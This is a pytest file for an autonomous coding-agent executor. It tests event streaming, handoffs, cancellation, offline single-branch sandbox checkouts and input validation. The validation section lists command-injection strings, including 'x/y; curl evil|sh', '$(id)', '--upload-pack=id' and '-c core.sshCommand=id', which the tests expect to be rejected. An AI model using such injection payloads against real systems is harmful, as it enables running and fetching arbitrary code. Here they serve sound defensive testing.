import asyncio
import uuid

import pytest
from langchain_core.messages import AIMessage

from anvil.runtime.executor import DeepAgentExecutor, sandbox_name, skill_files, skills_hash, work_branch

RUN = {"run_id": "r-123456789", "session_id": "s-1", "repo": "vishal7pandey/rtems-examples",
       "base_ref": "main", "mode": "autonomous", "merge_policy": "human", "jira_key": "RTEMS-1"}


class FakeAgent:
    def __init__(self, items, on_handoff=None, fail=False, delay=0.0):
        self.items, self.on_handoff, self.fail, self.delay = items, on_handoff, fail, delay

    async def astream(self, *_args, **_kwargs):
        for item in self.items:
            if self.delay:
                await asyncio.sleep(self.delay)
            yield item
        if self.on_handoff:
            self.on_handoff({"goal": "g", "tried": "t", "evidence": "e", "hypothesis": "h", "next_step": "n"})
        if self.fail:
            raise self.fail if isinstance(self.fail, BaseException) else ValueError("boom")


class OfflineExecutor(DeepAgentExecutor):
    """No Docker, no Postgres: exercises the event flow only."""

    def __init__(self, **kw):
        super().__init__(**kw)
        self.received = None

    def sandbox_for(self, run):
        from deepagents.backends.protocol import ExecuteResponse

        class _Sandbox:
            id = "anvil-sbx-offline"

            def execute(self, command, *, timeout=None):
                return ExecuteResponse(output="0" * 40, exit_code=0)

        return _Sandbox()

    def checkout(self, sandbox, run):
        return {"repo": run["repo"], "path": "/workspace/x", "base_ref": "main", "branch": work_branch(run),
                "base_sha": "abc", "head_sha": "abc"}

    async def _persistence(self):
        return None, None

    def run_record(self, run, checkout):
        return checkout


def factory_for(items, **kw):
    def factory(config, sandbox, *, tools, on_handoff, checkpointer, store, skills):
        return FakeAgent(items, on_handoff=on_handoff if kw.get("handoff") else None,
                         fail=kw.get("fail", False), delay=kw.get("delay", 0.0))
    return factory


async def collect(gen):
    return [ev async for ev in gen]


def test_skill_files_and_hash_are_stable():
    files = skill_files()
    assert any(p.endswith("defect-fix/SKILL.md") for p, _ in files)
    assert skills_hash(files) == skills_hash(list(files))


def test_names():
    assert sandbox_name("s-1/../x") == "anvil-sbx-s-1..x"
    assert work_branch(RUN) == "anvil/rtems-1"
    assert work_branch({"run_id": "abcdef123"}) == "anvil/run-abcdef12"


async def test_start_success_flow():
    msg = AIMessage(content="done")
    ex = OfflineExecutor(agent_factory=factory_for([((), "updates", {"model": {"messages": [msg]}})]))
    events = await collect(ex.start(RUN, "fix it"))
    types = [e["type"] for e in events]
    assert types == ["run.status", "run.record", "message", "run.status"]
    assert events[0]["data"]["status"] == "running" and events[-1]["data"]["status"] == "succeeded"
    assert [e["seq"] for e in events] == [1, 2, 3, 4]


async def test_handoff_and_failure():
    ex = OfflineExecutor(agent_factory=factory_for([], handoff=True))
    events = await collect(ex.start(RUN, "x"))
    assert events[-1]["data"]["status"] == "handoff" and events[-2]["data"]["kind"] == "handoff"

    ex = OfflineExecutor(agent_factory=factory_for([], fail=True))
    events = await collect(ex.start(RUN, "x"))
    assert events[-1]["data"]["status"] == "failed" and "boom" in events[-2]["data"]["text"]


async def test_graph_step_limit_hands_off_instead_of_failing():
    from langgraph.errors import GraphRecursionError

    ex = OfflineExecutor(agent_factory=factory_for([], fail=GraphRecursionError("limit")))
    events = await collect(ex.start(RUN, "x"))
    assert events[-1]["data"]["status"] == "handoff"
    assert any("graph step limit" in str(e["data"].get("text", "")) for e in events)


async def test_cancel_stops_stream():
    items = [((), "updates", {"model": {"messages": [AIMessage(content=f"step {i}")]}}) for i in range(50)]
    ex = OfflineExecutor(agent_factory=factory_for(items, delay=0.01))
    seen = []

    async def consume():
        async for ev in ex.start(RUN, "x"):
            seen.append(ev)

    task = asyncio.create_task(consume())
    await asyncio.sleep(0.1)
    await ex.cancel(RUN)
    await task
    assert seen[-1]["data"]["status"] == "cancelled"
    assert len(seen) < 50


def test_checkout_inits_submodules_before_going_offline():
    class RecordingSandbox:
        def __init__(self):
            self.calls = []

        def set_network(self, network):
            self.calls.append(("network", network))

        def execute(self, command, *, timeout=None):
            self.calls.append(("execute", command))
            return type("R", (), {"exit_code": 0, "output": "BASE_SHA=" + "a" * 40 + "\nHEAD_SHA=" + "a" * 40})()

        def upload_files(self, files):
            return [type("U", (), {"path": p, "error": None})() for p, _ in files]

    sb = RecordingSandbox()
    DeepAgentExecutor(image="unused").checkout(sb, RUN)
    script = next(c for kind, c in sb.calls if kind == "execute")
    assert "git submodule update --init" in script
    # Online for the clone and submodules, offline afterwards.
    assert sb.calls[0] == ("network", "bridge") and sb.calls[-1] == ("network", None)


# -- integration: real container, real clone --------------------------------------------------

docker = pytest.importorskip("docker")


def _docker_ok():
    try:
        docker.from_env().ping()
        return True
    except Exception:
        return False


@pytest.mark.skipif(not _docker_ok(), reason="Docker not reachable")
def test_checkout_is_single_branch_and_creates_work_branch():
    # buildpack-deps:*-scm has bash + git; the sandbox drops all capabilities, so nothing can be
    # apt-installed inside it (which is the point).
    image = "buildpack-deps:bookworm-scm"
    ex = DeepAgentExecutor(image=image)
    run = {**RUN, "session_id": f"test-{uuid.uuid4().hex[:8]}"}
    from anvil.runtime.sandbox import DockerSandbox, SandboxSpec
    sb = DockerSandbox.start(SandboxSpec(image=image, name=f"claude-{run['session_id']}", user="root", uid=0))
    try:
        info = ex.checkout(sb, run)
        assert info["branch"] == "anvil/rtems-1" and len(info["base_sha"]) == 40
        refs = sb.execute(f"cd {info['path']} && git branch -a --format='%(refname)'").output.split()
        # Only the base branch is known: nothing else (e.g. branches holding withheld fixes) is reachable.
        remote_branches = {r for r in refs if r.startswith("refs/remotes/") and not r.endswith("/HEAD")}
        assert remote_branches == {"refs/remotes/origin/main"}
        assert {r for r in refs if r.startswith("refs/heads/")} == {"refs/heads/main", "refs/heads/anvil/rtems-1"}
        fetch = sb.execute(f"git -C {info['path']} config --get-all remote.origin.fetch").output.split()
        assert fetch == ["+refs/heads/main:refs/remotes/origin/main"]  # a later `git fetch` stays single-branch
        # Offline by default: even an explicit fetch of another branch must fail.
        leak = sb.execute(f"git -C {info['path']} fetch origin refs/heads/main:refs/remotes/origin/leak", timeout=60)
        assert leak.exit_code != 0
        assert info["network"] == "offline"
        assert "/workspace/.anvil/skills/defect-fix/SKILL.md" in info["skills"] and len(info["skills_hash"]) == 16
        assert "name: defect-fix" in sb.execute("cat /workspace/.anvil/skills/defect-fix/SKILL.md").output
        again = ex.checkout(sb, run)  # idempotent on a second message in the same session
        assert again["branch"] == "anvil/rtems-1"
    finally:
        sb.stop()


# -- input validation at the shell boundary (codex review of #8) --------------------------------

from anvil.runtime.executor import repo_path, validate_ref, validate_repo  # noqa: E402

MALICIOUS_REPOS = ["x/y; curl evil|sh", "x/$(id)", "x/y`id`", "../etc", "x/..", "x/.", "x", "x/y/z",
                   "x/y z", "x/y\nid", "", "x/-y\" ; id"]
MALICIOUS_REFS = ["-bad", "--orphan=x", "main; id", "a..b", "a//b", "a/", "x.lock", "$(id)", "a b"]


@pytest.mark.parametrize("repo", MALICIOUS_REPOS)
def test_malicious_repo_rejected(repo):
    with pytest.raises(ValueError):
        validate_repo(repo)


@pytest.mark.parametrize("ref", MALICIOUS_REFS)
def test_malicious_ref_rejected(ref):
    with pytest.raises(ValueError):
        validate_ref(ref, "branch")


def test_valid_inputs_pass():
    assert validate_repo("vishal7pandey/rtems-lwip") == "vishal7pandey/rtems-lwip"
    assert repo_path("vishal7pandey/rtems") == "/workspace/rtems"
    assert validate_ref("tc1/5776-base", "base_ref") == "tc1/5776-base"
    assert work_branch({"jira_key": "RTEMS-1", "run_id": "r"}) == "anvil/rtems-1"


class RecordingSandbox:
    id = "rec"

    def __init__(self):
        self.commands = []

    def execute(self, command, *, timeout=None):
        self.commands.append(command)
        from deepagents.backends.protocol import ExecuteResponse
        return ExecuteResponse(output="", exit_code=0)

    def set_network(self, network):
        self.commands.append(f"<network {network}>")


@pytest.mark.parametrize("field,value", [("repo", "x/y; touch /tmp/pwned"), ("base_ref", "--upload-pack=id"),
                                         ("branch", "-c core.sshCommand=id")])
def test_checkout_executes_nothing_for_malicious_run(field, value):
    sb = RecordingSandbox()
    with pytest.raises(ValueError):
        DeepAgentExecutor(image="unused").checkout(sb, {**RUN, field: value})
    assert sb.commands == []


async def test_start_reports_failed_setup_for_malicious_repo():
    class Ex(DeepAgentExecutor):
        def sandbox_for(self, run):
            return RecordingSandbox()

    events = await collect(Ex(image="unused").start({**RUN, "repo": "x/$(id)"}, "go"))
    assert events[-1]["data"]["status"] == "failed"
    assert "invalid repo" in events[-2]["data"]["text"]


async def test_unverified_result_becomes_a_handoff_without_a_wip_branch():
    msg = AIMessage(content="done")
    items = [((), "updates", {"model": {"messages": [msg]}})]
    pushed = []
    ex = OfflineExecutor(agent_factory=factory_for(items),
                         verify_hook=lambda run, sb: ["CI on PR #10 is `none` (failing: -), not green"],
                         push_hook=lambda sb, run, wip: pushed.append(wip))
    events = await collect(ex.start(RUN, "fix it"))
    assert events[-1]["data"]["status"] == "handoff" and not pushed
    assert any("could not be verified" in str(e["data"].get("text", "")) for e in events)

    ok = OfflineExecutor(agent_factory=factory_for(items), verify_hook=lambda run, sb: [])
    assert (await collect(ok.start(RUN, "fix it")))[-1]["data"]["status"] == "succeeded"

    broken = OfflineExecutor(agent_factory=factory_for(items), verify_hook=lambda run, sb: 1 / 0)
    assert (await collect(broken.start(RUN, "fix it")))[-1]["data"]["status"] == "handoff"
